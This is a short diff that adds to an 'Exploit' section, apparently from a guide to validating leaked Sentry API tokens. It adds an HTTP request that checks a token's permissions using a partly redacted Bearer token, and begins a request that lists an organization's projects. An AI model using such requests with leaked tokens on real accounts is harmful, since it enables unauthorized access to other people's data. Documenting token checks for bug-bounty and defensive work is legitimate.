@@ -12,6 +12,18 @@
 
 ## Exploit
 
+Check token permission
+
+```
+GET /api/0/ HTTP/2
+Host: sentry.io
+Authorization: Bearer sntrys_eyJpYXQiOj**
+```
+
+
+
+Exploit
+
 ```
 GET /api/0/organizations/[name-org]/projects/ HTTP/2
 Host: sentry.io
